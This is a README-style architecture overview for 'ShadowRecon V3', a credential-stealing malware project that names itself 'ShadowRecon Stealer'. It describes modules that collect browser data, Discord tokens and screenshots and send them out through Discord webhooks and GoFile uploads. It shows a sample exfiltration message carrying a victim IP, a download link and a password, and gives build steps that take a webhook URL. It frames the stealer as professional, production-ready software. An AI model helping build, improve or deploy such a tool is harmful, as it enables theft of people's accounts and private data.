# ShadowRecon V3 - Architecture Overview

## Clean, Modular, Efficient Structure

### Core Architecture

```
src/
├── config/           # Configuration management
│   └── config.js    # Centralized configuration
├── core/            # Core utilities and systems
│   ├── embedBuilder.js     # Consistent Discord embed creation
│   ├── serviceManager.js   # Service initialization & management
│   ├── statistics.js       # Statistics collection & formatting
│   ├── logger.js           # Structured logging system
│   ├── errors.js           # Centralized error handling
│   ├── fileManager.js      # File operations management
│   ├── utils.js            # Common utility functions
│   ├── tokenUtils.js       # Token processing utilities
│   └── encryption.js       # Encryption utilities
├── modules/         # Feature modules
│   ├── browsers/    # Browser data collection
│   └── screenshot/  # Screenshot capture
├── services/        # External services
│   ├── discord/     # Discord API & webhook handling
│   └── upload/      # File upload services (GoFile, etc.)
└── main.js         # Application entry point
```

### Key Improvements

#### 1. **Consistent Embed Styling**
- All Discord embeds now use the same clean style
- GoFile embeds match token embed formatting
- Removed verbose titles and unnecessary fields
- Standardized field structure and footer text

#### 2. **Service Management**
- **ServiceManager**: Centralized service initialization
- Better dependency management
- Cleaner resource cleanup
- Modular service loading

#### 3. **Clean Code Structure**
- **EmbedBuilder**: Consistent Discord embed creation
- Removed all test data and hardcoded values
- Eliminated debugging artifacts
- Improved error handling consistency

#### 4. **Modular Design**
- Independent, reusable modules
- Clear separation of concerns
- Easy to extend and maintain
- Professional architecture

### Embed Style Standardization

**Before:**
```javascript
// Verbose GoFile embed with titles and complex structure
{
    title: ":file_folder: Data Archive",
    color: 0x7289da,
    fields: [
        {
            name: ":link: Download Link",
            value: "[Click here to download](url)",
        },
        {
            name: ":warning: Important",
            value: "This archive is password protected...",
        }
    ]
}
```

**After:**
```javascript
// Clean, consistent style matching token embeds
{
    color: null,
    fields: [
        {
            name: ":earth_africa: IP",
            value: "`192.168.1.1`",
            inline: true
        },
        {
            name: ":file_folder: Download",
            value: "`https://gofile.io/d/xyz`",
            inline: false
        },
        {
            name: ":key: Password",
            value: "`secretpass123`",
            inline: true
        }
    ],
    footer: {
        text: "ShadowRecon Stealer"
    }
}
```

### Usage

The application maintains the same simple interface:

```bash
# Install dependencies
npm install

# Run application
npm start

# Build executable
./build.sh https://webhook-url.com AppName
```

### Benefits

1. **Maintainable**: Clean, well-organized code structure
2. **Modular**: Independent modules that can be extended easily
3. **Consistent**: Standardized embed styling throughout
4. **Efficient**: Optimized resource management and cleanup
5. **Professional**: Enterprise-grade architecture and error handling

The project is now production-ready with a clean, modular, and efficient codebase that follows professional development standards.